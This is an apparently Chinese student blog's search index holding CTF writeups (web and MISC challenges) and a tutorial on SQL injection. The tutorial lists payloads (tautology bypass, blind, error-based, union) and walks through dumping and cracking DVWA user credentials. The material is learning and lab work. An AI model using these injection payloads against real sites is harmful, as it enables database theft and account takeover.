<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>南邮CTF-WEB-writeup</title>
      <link href="/2019/07/19/NYWEB/"/>
      <url>/2019/07/19/NYWEB/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB题"><a href="#WEB题" class="headerlink" title="WEB题"></a>WEB题</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>  打开界面看到：key在哪里？ 签到题都不会很难，查看源代码。</p><p><img src="http://i2.tiimg.com/693893/790efd1ced160d5d.png" alt="签到"></p><h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p> 首先还是先看看题<br><img src="http://i2.tiimg.com/693893/767f3f0592931fcf.png" alt="MD5"></p><p>题目提示给出了MD5 中间又有 md51=md52 看到前面有QNKCDZO 那么很显然啊 就是找到和‘QNKCDZO’md5加密后相同的字符串。</p><p>将QNKCDZO进行MD5加密，密文为0e830400451993494058024219903391</p><p>PS：这里有个点需要注意 它的=是两个==  所以两个等号代表的是比较变量的值，而不会去比较变量的类型。</p><p>在这里源码是PHP 肯定有它的用处那么PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。<br>因为0exx都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可。所以这里我们来找到相关的字符串</p><p>PS:0e开头MD5小节</p><p>s878926199a<br>0e545993274517709034328855841020<br>s155964671a</p><p>0e342768416822451524974117254469<br>s214587387a</p><p>0e848240448830537924465865611904<br>s214587387a</p><p>0e848240448830537924465865611904<br>s878926199a</p><p>0e545993274517709034328855841020<br>s1091221200a</p><p>0e940624217856561557816327384675<br>s1885207154a</p><p>之后在题目地址栏中输入A 就可以看到flag了<br><img src="http://i2.tiimg.com/693893/b958d833b0ff1f00.png" alt="MD5"></p><h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p> <img src="http://i2.tiimg.com/693893/d2d893da020908db.png" alt="签到"><br>看到让输入口令那就输入白。<br>然后输入的时候发现他有设置字数的限制。那我们就F12 修改吧。<br><img src="http://i2.tiimg.com/693893/badff07add372e19.png" alt="签到"><br>maxlength 之前是10 这里我给他改成了13  然后输入 口令<br><img src="http://i2.tiimg.com/693893/b23b10da1641358d.png" alt="签到"></p><h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>打开上来就告诉你这题不是WEB<br><img src="http://i2.tiimg.com/693893/a3d9527d17c58dda.png" alt="web"><br>看到一张图  莫名？？？  看看源代码 也没发现啥 有没有可以输入的地方  题目还说不是web  不会是这个图片藏了东西吧  应该是  下载 放到winhex 里看看</p><p>然后看看开头跟结尾 在结尾发现了flag<br><img src="http://i2.tiimg.com/693893/8530ac825611f5b1.png" alt="web"></p><h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p>题目上给了个a标签地址说是个微博。。点进去看看还真是。看题看题 进入题目</p><p><img src="http://i1.fuimg.com/693893/aa9ad34fd02fc0d9.png" alt="题目"><br>搜索一下还真就可以，不过下面为啥一大片的空白。F12 检查检查。<br><img src="http://i1.fuimg.com/693893/8271f5da252f93b2.png" alt="检查"></p><p>看到两个网址<br><img src="http://i1.fuimg.com/693893/fae09ce72f207bc2.png" alt="网址"><br>一个是南京论之语，嗯这个跟题目没得关系，看上面那个so.html<br>展开标签看到了一堆。。。<br><img src="http://i1.fuimg.com/693893/124c16a1fc9a2825.png" alt="展开"><br>????有点懵噢   咋一个套一个。。还这么多，题目是层层递进。这里肯定有东西。看到了一个404的<br><img src="http://i1.fuimg.com/693893/e6f0a59b1bc62bcc.png" alt="404"></p><p>放到地址栏后面打开。果然有东西。<br>F12走一波<br><img src="http://i1.fuimg.com/693893/83ad2b8f657611ce.png" alt="检查"><br>看完后除了TD标签里一大堆的JS文件，也没啥，这么多JS？？？而且页面很简洁。<br>仔细瞅了一下又还真就是对了。<br><img src="http://i1.fuimg.com/693893/3dbe3d98e904206d.png" alt="结果"></p><h2 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h2><p>打开题目链接<br><img src="http://i1.fuimg.com/693893/712a25e9e70d92ca.png" alt="题目"><br>记得学长说过，中间有表情是颜文字，不过应该是加过密的，编码不同应该是，先解一下，<br><img src="http://i1.fuimg.com/693893/4a3e5165ea052898.png" alt><br>颜文字出来了<br>控制台跑一波白<br><img src="http://i1.fuimg.com/693893/edc548bbba70dc0e.png" alt="答案"></p><h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p>打开题目 很是有趣啊 靠手速 哈哈哈哈<br><img src="http://i1.fuimg.com/693893/52f2e66b1639ce03.png" alt><br>看地址栏给你说没有key   只有这一个链接<br>看源代码也啥都没有 点跳转的时候发现有两个跳转。。原谅我手速不够啊  地址栏跳的太快了 截不了图啊<br> 这样的话应该要抓个包了 记得学长用过<br><img src="http://i1.fuimg.com/693893/6a859726f4be9400.png" alt="抓包"><br>首先先进行一波配置啊  我这里的配置参考的是 <a href="http://www.mamicode.com/info-detail-2206437.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2206437.html</a><br><img src="http://i1.fuimg.com/693893/4f820063d24a8ec1.png" alt="答案"></p><h2 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h2><p>之前学过的PHP 试试<br><img src="http://i1.fuimg.com/693893/7e371088ce198670.png" alt><br>eval??/这里应该是输出了吧</p><p>PHP eval() 函数</p><p>定义和用法<br>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p><p>提示和注释<br>注释：返回语句会立即终止对字符串的计算。</p><p>注释：该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p><p>例子<br>&lt;?php<br>$string = “beautiful”;<br>$time = “winter”;</p><p>$str = ‘This is a $string $time morning!’;<br>echo $str. “<br>“;</p><p>eval(“\$str = \”$str\”;”);<br>echo $str;<br>?&gt;<br>输出：</p><p>This is a $string $time morning!<br>This is a beautiful winter morning! </p><p>但在这里eval里面肯定就是flag了，找个在线代码执行的网站，复制粘贴代码，将eval改成echo即可，得到flag！<br><img src="http://i1.fuimg.com/693893/7eafcebecc9f1ae9.png" alt="答案"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>没错 这就是传说中的LFI  LFI。。。我又孤陋寡闻了 问问度娘  本地文件包含。。看大佬的blog详解<br><img src="http://i1.fuimg.com/693893/89c6b805c62b5c2d.png" alt><br>暂时还不太了解，等后续了解完 在进行更新这道题目了。</p><h2 id="单身一百年"><a href="#单身一百年" class="headerlink" title="单身一百年"></a>单身一百年</h2><p>又是这个？跟上一道题 那再来抓个包吧<br>OK拿到了<img src="http://i1.fuimg.com/693893/63fa3ef9da79ef6c.png" alt><br>单身一百年的手速不如抓个包啊！</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>打开跳转到了百度百科<br>robots协议 锁定<br>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>前面更新的时候做过这个类型的题<br><img src="http://i1.fuimg.com/693893/538df062df5039c7.png" alt="题目"></p><p>提示sql.php，说明要到这个页面进行操作</p><p>代码信息：</p><p>要用get方法传一个id参数</p><p>但值要为什么呢？注意到了1024这个数字和intval()函数，输进来的数字会经过这个函数的处理</p><p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。<br>输入id=1024，显示‘no！try again’<br>输入id=1023，显示‘no msg in 1023~’<br>输入id=1025，显示‘no more’</p><p>那估计是1024点几</p><p><img src="http://i1.fuimg.com/693893/b2d275e8d57ace9b.png" alt></p><p>这题。。。卡了我大半天。。</p><p>PS：</p><p>1.mysql_connect() 函数打开非持久的 MySQL 连接。</p><p>2.mysql_select_db() 函数设置活动的 MySQL 数据库。</p><p> 如果成功，则该函数返回 true。如果失败，则返回 false。</p><p>3.mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有</p><p> 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><p>4.mysql_query() 函数执行一条 MySQL 查询。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web练习（一） </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的学习与个人理解</title>
      <link href="/2019/07/17/SQL/"/>
      <url>/2019/07/17/SQL/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是SQL注入攻击"><a href="#什么是SQL注入攻击" class="headerlink" title="什么是SQL注入攻击"></a>什么是SQL注入攻击</h2><p>刚开始接触未免不清楚什么是SQL注入攻击，SQL注入不同于XSS攻击。SQL注入攻击通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。目前是对数据库进行攻击的最常用手段之一。</p><h2 id="SQL注入产生的原因"><a href="#SQL注入产生的原因" class="headerlink" title="SQL注入产生的原因"></a>SQL注入产生的原因</h2><p>当我们访问动态网页时, Web 服务器会向数据访问层发起SQL查询请求，如果权限验证通过就会执行 SQL 语句。 这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造 SQL 语句，如果用户输入的数据被构造成恶意 SQL 代码，Web 应用又未对动态构造的 SQL语句使用的参数进行审查。所以就产生了一定的危害。</p><p>在安恒的平台上学习的时候，它给了这样的例子：<br>首先我们的数据库中有一个表格<br><img src="http://i2.tiimg.com/693893/fadbaaa48e16a90c.png" alt="表格"></p><p>之后对应的有登录页面，输入用户的账号密码，查询数据库，进行登录。在文本框内输入查询信息，提交能够达到显示登录结果。<br><img src="http://i2.tiimg.com/693893/470d77974a8fe550.png" alt="测试"></p><p>但是SQL中有一个万能语句就是 ‘ or 1=’1，那么为什么是万能语句，为什么他能够绕过验证登录，进去。例如安恒给的测试：<br><img src="http://i2.tiimg.com/693893/f579bb40ddb9f34d.png" alt="测试"><br>在这个程序中，SQL语句为</p><p><code>SELECT * FROM USERS WHERE ACCOUNT=&#39;aa&#39; OR 1=1 --&#39; AND PASSWORD=&#39;aa&#39;</code></p><p>这里面–表示注释，这样看的话真正的SQL语句就是：<br><code>SELECT * FROM USERS WHERE ACCOUNT=&#39;aa&#39; OR 1=1</code><br>在这里，“1=1”它一定是真，是永真，所以该语句将返回USERS表中的所有记录。网站就受到了这个攻击。</p><p>还有一种是通配符进行注入（此前并不知道这也是SQL注入的一种，也是刚刚通过安恒的课程了解到。）<br><img src="http://i2.tiimg.com/693893/1b018d5ea82a6660.png" alt="通配符例子"><br><img src="http://i2.tiimg.com/693893/76ec16606a6f3524.png" alt="例如"><br><img src="http://i2.tiimg.com/693893/32fa92bd16eb0973.png" alt="解析"></p><h2 id="SQL注入语句分类"><a href="#SQL注入语句分类" class="headerlink" title="SQL注入语句分类"></a>SQL注入语句分类</h2><h3 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h3><p>  基于整型的SQL注入即存在SQL注入漏洞的URL参数为整数类型。</p><p>应用程序数据库的字符型SQL语句为：<br><code>SELECT * FROM admin WHERE id =1 and 1=1</code></p><h3 id="字符串注入"><a href="#字符串注入" class="headerlink" title="字符串注入"></a>字符串注入</h3><p> <code>SELECT * FROM admin WHERE id = &#39;1&#39; and 1=1#&#39;</code></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><pre><code>SELECT * FROM admin WHERE id LIKE &apos;%1%&apos; and &apos;%&apos;=&apos;%&apos;</code></pre><h3 id="Time盲注"><a href="#Time盲注" class="headerlink" title="Time盲注"></a>Time盲注</h3><pre><code>SELECT * FROM admin WHERE id =1 AND (SELECT if((SELECT substru(table_name,1,1) FROM users limit 0,1)=&apos;e&apos;,sleep(10),null))</code></pre><h3 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h3><pre><code>SELECT * FROM admin WHERE id = 1 and ascii(substr((SELECT database()),1,1,((&gt;99</code></pre><h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><pre><code>SELECT *FROM admin where ID = 1 AND (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre><h3 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h3><pre><code>SELECT column1,column2,colmn3 FROM admin WHERE id =&apos;1&apos; UNION SELECT column1, column2, column3 FROM users;</code></pre><p>PS:这里面的个别语句个人也不是很懂得，但总是需要先记录了解下来，之后在日后的学习中，逐步完善自己的知识储备。</p><h2 id="判断Sql注入漏洞的类型"><a href="#判断Sql注入漏洞的类型" class="headerlink" title="判断Sql注入漏洞的类型"></a>判断Sql注入漏洞的类型</h2><p> 通常 Sql 注入漏洞分为 2 种类型：</p><ul><li><p>数字型</p></li><li><p>字符型</p></li></ul><p> <br>其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。</p><h3 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h3><p>输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下： select * from &lt;表名&gt; where id = x 这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：</p><p> Url 地址中输入 <a href="http://xxx/SL.phP?id=" target="_blank" rel="noopener">http://xxx/SL.phP?id=</a> x and 1=1 页面依旧运行正常，继续进行下一步。</p><p> Url 地址中继续输入 <a href="http://xxx/SL.php?id=" target="_blank" rel="noopener">http://xxx/SL.php?id=</a> x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。 </p><p> 原因如下： 当输入 and 1=1时，后台执行 Sql 语句：</p><p>  <code>select * from &lt;表名&gt; where id = x and 1=1</code></p><p>没有语法错误且逻辑判断为正确，所以返回正常。</p><p> 当输入 and 1=2时，后台执行 Sql 语句：</p><p> <code>select * from &lt;表名&gt; where id = x and 1=2</code></p><p>没有语法错误但是逻辑判断为假，所以返回错误。 我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：<br>  <code>select * from &lt;表名&gt; where id = &#39;x and 1=1&#39;</code></p><p>  <code>select * from &lt;表名&gt; where id = &#39;x and 1=2&#39;</code></p><p>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p><h3 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h3><p> 当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下： select * from &lt;表名&gt; where id = ‘x’ 这种类型我们同样可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</p><p> Url 地址中输入 <a href="http://xxx/abc.php?id=" target="_blank" rel="noopener">http://xxx/abc.php?id=</a> x’ and ‘1’=’1 页面运行正常，继续进行下一步。<br> Url 地址中继续输入 <a href="http://xxx/abc.php?id=" target="_blank" rel="noopener">http://xxx/abc.php?id=</a> x’ and ‘1’=’2 页面运行错误，则说明此 Sql 注入为字符型注入。</p><p> 原因如下： 当输入 and ‘1’=’1时，后台执行 Sql 语句：</p><p>  <code>select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;1&#39;</code></p><p>  可以看到语法正确，逻辑判断正确，所以返回正确。</p><p>  当输入 and ‘1’=’2时，后台执行 Sql 语句：<br>  <code>select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;2&#39;</code></p><p>语法正确，但逻辑判断错误，所以返回正确。</p><h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><h3 id="SQL基本语句"><a href="#SQL基本语句" class="headerlink" title="SQL基本语句"></a>SQL基本语句</h3><p> 在进行注入练习前我认为需要进行SQL语句的练习。首先select的语句前面注入里就可以看到它的重要性了。<br>PHPstudy中本身就有sql的命令行，可以直接的进行练习。</p><p>（1）使用数据库<br>use 数据库名称;</p><p>（2）在users表里查询用户名为‘admin’的所有信息</p><pre><code>select * from users where user=&apos;admin&apos;</code></pre><p>有三个要点，</p><ol><li>‘*’:通配符表示匹配所有内容，也就是来者不拒</li><li>‘where’:关键字作为条件限定。</li><li>在数据库中字符串时一般由单引号包住的<br>在这里，select是从数据库检索数据的。</li></ol><p>union 联合</p><p>就是将union前面的数据，和后面的数据放在一起，以便能在一个表显示。什么叫放在一起呢？<br>请看例子：</p><pre><code>select 1,2,3 union select 4,5,6;</code></pre><p>解析，我们知道select 1,2,3是输出三个数字，分别为1,2,3。后面的select也是一样输出3个数字。<br>要是后面的输出的数据数目不一致，那么则会导致下列的错误</p><pre><code>The used SELECT statements have a different number of columns`</code></pre><p>order by<br>这个是让我们检索出来的数据进行升序或者降序排列的。</p><pre><code>select user,user_id from users order by user</code></pre><p>在这里我们，介绍一个概念就是“字段”。字段也就是一个表里面的数据列，每一个字段表示一列。我们这里，我们select语句检索user,user_id两个数据列。当我们使用order by user的时候，会根据user数据列的的每一个数据的来进行排序，默认是升序asc。</p><p> PS：我们除了使用字段名来作为order by的条件外，还可以使用数字。</p><p>  1表示的第一个字段</p><p>  2表示的第二个字段<br>  如此类推就可以了，但是当不存在那个字段的时候，就会产生这样的错误</p><pre><code>unknown column name xx</code></pre><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>  还是通过安全龙进入DVWA实验室找到需要练习的项目<br>  <img src="http://i2.tiimg.com/693893/e62764dc44d42485.png" alt="练习1"><br>首先让我们输入ID 那就输个1或者2看看吧</p><p>  <img src="http://i2.tiimg.com/693893/06934ae559a59d93.png" alt="练习1"></p><p>  <img src="http://i2.tiimg.com/693893/6bcbcf2163813b8a.png" alt="练习1"></p><p>这里可以看到它返回三行数据，一行是我们输入的用户ID。一行是用户名，另外一行是用户别名。<br><img src="http://i2.tiimg.com/693893/5536d6ddd32938aa.png" alt="练习1"></p><p>这里看到地址栏中 ？id=1<br>这不就是注入的吗 对id这个参数进行测试<br>这里我们在输入框里面输入“1’”，注意1后面有一个单引号“’”。<br>可以发现，这里报错了。说我们的sql语句出现语法错误。</p><p>之后我们开始注入首先我们需要 分析字段数<br>基本的话，他也是有两种方法的<br>分析字段数的原因是我们之后需要用union select语句获得我们需要的敏感数据。<br>）<br>根据order by知识知道，要是后面跟着的数字超出了字段数的时候，则会报错！通过这个我们可以确定字段数。<br>我们构造的payload如下：<br>1’ order by 1#<br>1’ order by 2#<br>1’ order by 3#<br>当输入到3的时候，发现它报错了。也就是说明字段数为2</p><p><img src="http://i2.tiimg.com/693893/0554b2d2a84807bc.png" alt="练习1"></p><p>那字段数为2，也就是select出来的数据列有两列。也就是我们可以通过union select出两个数据。好了我们来获得关于我们数据库的信息吧！<br>1、获取当前数据库名字，当前用户名<br>1’ union select database(),user()#</p><p>atabase()将会返回当前网站所使用的数据库名字，user()将会返回进行当前查询的用户名。<br><img src="http://i2.tiimg.com/693893/a0b1a14cd999add9.png" alt="练习1"></p><p>这里我们看到<br>当前数据库为:dvwa<br>当前用户名:root@localhost</p><p>但是我们的目的的是获取当前的用户表，根据上面的信息，我们知道当前数据库名为dvwa。可是还不够。</p><p>突然感觉自己会的语句真的不多。。。于是去找了找语句，参考了下 看到了这段话  </p><pre><code>information_schema，是一个包含了mysql数据库所有信息的新华字典，有啥关于数据库的信息不知道问它没问题！它本质上还是一个database，存着其他各个数据的信息。在其中，有一个表长成这样tables。有一个表长这样columns。tables这个表存的是关于数据库中所有表的信息，他有个字段叫table_name，还有个字段叫做table_schema。其中table_name是表名，table_schema表示的表所在的数据库。对于columns，它有column_name,table_schema,table_name</code></pre><p>我们拥有的消息是数据库名，也就是说我们可以用</p><p>   <code>-1&#39; union select table_name,2 from information_schema.tables where table_schema= &#39;dvwa&#39;#</code></p><p>information_schema不就使我们的新华字典咯！这里我们使用一种语法，<br>“数据名.表名”<br>tables就相当于我们新华字典的目录，table_name是tables里面的字段。语句的意思就是，这里是一本新华字典帮我把数据库名为”dvwa”这个偏旁部首的字(表名)找出来。</p><p><img src="http://i2.tiimg.com/693893/4f9005310806805a.png" alt="练习1"></p><p>看到了users 这个肯定是我们需要找到表了 那么我们猜列名，注入</p><p><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name =&#39;users&#39;#</code></p><p>得到列：<br>    user_id, first_name, last_name, user, password, avatar, last_login, failed_login, id, username,password</p><p><img src="http://i2.tiimg.com/693893/310c1b506fc68149.png" alt="练习1"></p><p>PS：使用这个需要注意。如果显示的地方太小你会看不到后面的字符，所以如果有限制建议一个一个的爆出来。</p><p>猜用户密码，注入：</p><p>1’ union select null,concat_ws(char(32,58,32),user,password) from users #  </p><p>得到用户信息，例如admin数据，</p><p><img src="http://i2.tiimg.com/693893/88cdf1edeeb8a019.png" alt="练习1"><br>我们看到了admin 5f4dcc3b5aa765d61d8327deb882cf99 账号密码 后面被加密了 应该是MD5解一下发现对应的就是password OK那么我们下面的账号密码应该都有了 解密 gordonb  密码是abc123</p><p>OK我们来登陆试试<br><img src="http://i2.tiimg.com/693893/86a530a5c8cec685.png" alt="练习1"><br>登录成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先mysql的语法</p><p>在where语句中，当出现多个字符串的时候，“=”将会选择优先级最高的一个，优先级是从左到右，依次降低的！也就是离“=”最近的一个。</p><p>例子。</p><p>第一个是和我们上面类似的sql查询语句</p><p>select * from users where user_id = ‘1’’’;</p><p>第二个是来阐明我们这个优先级的，</p><p>select * from users where user_id = ‘1’’2’;</p><p>可以看到，出来的结果还是和user_id=1一样。</p><p>我们再看一个长长的，</p><p>select * from users where user_id = ‘1’’2’’abc’’efg’;</p><p>事实胜于雄辩，可以看到结果还是和上面的一样。</p><p>测试方法(在判断注入时，最后一个引号没被闭合)：</p><p>使用“#”符号来注释后面的单引号<br>到时查询语句将会变成这样，<br>select firstname,surname from users where id = ‘1’#’;</p><p>使用“– ”，这里注意了“–”后面有一个空格。在url当中，我们需要使用“+”来代替“–”后面的空格。<br>到时查询语句将会变成这样，<br>select firstname,surname from users where id = ‘1’– ‘;</p><p>information_schema，是一个包含了mysql数据库所有信息的新华字典，有啥关于数据库的信息不知道问它没问题！它本质上还是一个database，存着其他各个数据的信息。在其中，有一个表长成这样tables。有一个表长这样columns。tables这个表存的是关于数据库中所有表的信息，他有个字段叫table_name，还有个字段叫做table_schema。其中table_name是表名，table_schema表示的表所在的数据库。对于columns，它有column_name,table_schema,table_name</p><p>暂时先初级，容我消化一下继续进行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL练习（一） </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC（一）练习</title>
      <link href="/2019/07/14/XL/"/>
      <url>/2019/07/14/XL/</url>
      
        <content type="html"><![CDATA[<h2 id="i春秋-MISC-神秘的文件"><a href="#i春秋-MISC-神秘的文件" class="headerlink" title="i春秋 MISC 神秘的文件"></a>i春秋 MISC 神秘的文件</h2><p>一天最少一道CTF题目，只能多不能少<br>下载文件，并没有后缀，winhex走一波发现开头是一个PNG文件<br><img src="/2019/07/14/XL/ML1.PNG" alt="Image"></p><p>更改后缀后，得到图片，打开<br><img src="/2019/07/14/XL/ML2.PNG" alt="Image"><br> 题目说：不知名的文件，貌似已经损坏，你能找到里面隐藏的信息吗？<br>  看来这个文件应该是被损坏过了，而且还有隐藏的信息。看完winhex中<br>  没有什么新的收获。</p><p>既然这样给放到Stegsolve.jar 中看看有啥隐藏的东西。<br>正常的流程向下翻着看发现了这点东西。根据我之前写的隐写LSB发现这里面有点东西。<br><img src="/2019/07/14/XL/ML3.PNG" alt="Image"><br>那索性就给他直接分析一波。<br>使用Analyse，Data Extrect查看一下。<br><img src="/2019/07/14/XL/ML4.PNG" alt="Image"><br>之后save Bin下来，然后题目又知道这个文件损坏，那肯定是叫我们修复文件。<br>也不是压缩包，怎么修复。winhex再次看看里面有啥东西没有。<br><img src="/2019/07/14/XL/ML5.PNG" alt="Image"><br>感觉没什么不对的 头尾也不是正常的png jpg gif的格式，百度了一下图片格式的文件头尾，感觉收获不大。再次返回winhex查看。感觉有点不太懂，尝试着转化了其他格式的也不对，无奈去大佬的blog查看一下 竟然是个BMP文件 之前没有了解到 然后使用了BMP文件头尾进行了更改为<br>424D 之后打开。<br><img src="/2019/07/14/XL/MLFLAG.PNG" alt="Image"><br>得到flag</p><p> PS：补充文件头的类型格式的补充，还需要的对这些进行加强理解。<br> <img src="/2019/07/14/XL/MLPS.PNG" alt="Image"></p><h2 id="丘比龙De女神"><a href="#丘比龙De女神" class="headerlink" title="丘比龙De女神"></a>丘比龙De女神</h2><h3 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h3><p>丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！<br>没错 里面隐藏了一张女神的照片 flag是照片文件的md5值(小写) 记住加上flag{}</p><p>既然是一张照片而且名字就是gif 那直接改后缀.gif。得到一张动图，然而图片中并没有任何的提示语句。<br><img src="/2019/07/14/XL/DL1.PNG" alt="Image"><br>题目中也说这里面隐藏了一张女神的照片，那应该就是zip压缩格式了。直接改后缀为zip。发现里面果然有一张照片<br><img src="/2019/07/14/XL/DL2.PNG" alt="Image"><br>直接解压，发现解压不出来。可以看到压缩包中有一个名为nvshen.jpg的图片文件，但是压缩包是损坏的，没有办法将他解压出来，所以我进一步得出结论，由于可以正常的显示出gif文件，所以这个文件的gif部分的文件头和文件尾是正常的，然后存在正常的zip文件的尾部，所以问题一定是出现在他的zip文件头。</p><p>由于在十六进制的gif文件中后边存在nvshen.jpg这样的字样，我们搜索以下以下前边还有没有关于这个文件的信息。</p><p>搜索里面的nvshen 看到</p><p><img src="/2019/07/14/XL/DL5.PNG" alt="Image"><br>看到前面有个love，love前面的代码又有个分号，003B这好像是gif动态图的结尾。那我们既然知道这个里面有隐藏的文件前面又结尾了，这不是正好吗，zip的头部不正好从这里开始吗，那我就直接开始整了 把6C 6F 76 65改成了50 4B 03 04。再打开试试看</p><p><img src="/2019/07/14/XL/DL4.PNG" alt="Image">嗯哼，能打开了。<br>可是文件竟然要密码。前面刚好看到love，第一反应，谁没事干在自己的文件里放这个词 ，输进去看看。哦吼，打开了。果然</p><p><img src="/2019/07/14/XL/DL6.PNG" alt="Image"><br>PS：题目给我说flag是照片文件的md5值。那就网上搜索一波，发现了这个网站<a href="http://tool.zhengxianjun.com/file-hash" target="_blank" rel="noopener">http://tool.zhengxianjun.com/file-hash</a><br>进去把图片传上去。解开<br><img src="/2019/07/14/XL/DL7.PNG" alt="Image"><br>成功拿到了flag。</p><p>PS：本题目的考察是对不同类型十六进制文件的文件头掌握,信息收集，对损坏文件的修补。</p><h2 id="功夫秘籍"><a href="#功夫秘籍" class="headerlink" title="功夫秘籍"></a>功夫秘籍</h2><p>简介：传说得到这个秘籍的人都修炼成了绝世神功。（话说咱也想练成绝世神功）<br>下载下来看是个压缩包，那就直接开，结果它打不开。打不开就扔到winhex中吧<br><img src="/2019/07/14/XL/KF1.PNG" alt="Image"><br>开头提示我是PNG。那就把图片转化为PNG打开<br><img src="/2019/07/14/XL/KF2.PNG" alt="Image">（如来神掌）还是继续放到winhex中吧。<br>看看开头看看结尾。发现结尾好像有提示。<br><img src="/2019/07/14/XL/KF3.PNG" alt="Image"><br>将其抠出来 猜想是某种加密方式，base64解码得：</p><p><img src="/2019/07/14/XL/KF4.PNG" alt="Image"></p><p>T_ysK9_5rhk__uFMt}3El{nu@E<br>看到}{ 这个特征略明显的就是栅栏解密啊<br>位数嘛我就试了两次就出来了<br><img src="/2019/07/14/XL/KF5.PNG" alt="Image"><br>输入就OK了 （绝世秘籍给你了）</p><h2 id="64格"><a href="#64格" class="headerlink" title="64格"></a>64格</h2><p>下载解压发现是个gif但是发现你却打不开这个gif 依旧丢到winhex里面去，发现少文件头。那咱就加上这里我用的010 editor 这个加东西个人感觉方便点<br><img src="/2019/07/14/XL/GZ1.PNG" alt="Image"><br>然后图片就开始动起来。发现一个小黄人64格中一直动，之后我用PS打开了这个文件，发现又19个图层一个一个的保存下来看看<br><img src="/2019/07/14/XL/GZ2.PNG" alt="Image"><br>题目是64格。图片中是64个格子。第一反应base64但是 那是解密 我们需要对应的字母 应该是64进制没错了 继续看一波</p><p><img src="/2019/07/14/XL/GZ3.PNG" alt="Image">正好64个格子对应的应该是64进制，之后对应这维尼所在的格子求得18个数字<br>16，53，17等等<br>再将数字对应百度百科下的表解得字母<br>得到Q1RGe2FiY19kZWZfZ30<br>base64解码之<br>得到CTF{abc_def_g}</p><h2 id="flag-xls"><a href="#flag-xls" class="headerlink" title="flag.xls"></a>flag.xls</h2><p>直接下载看到了一个表格。？？表格什么鬼，打开还加密。</p><p><img src="/2019/07/14/XL/WD1.PNG" alt="Image"></p><p>那咱们换个用Notepad++打开、</p><p>直接打开了 可以看到<img src="/2019/07/14/XL/WD2.PNG" alt="Image"><br>打开之后尝试搜索flag或者key等 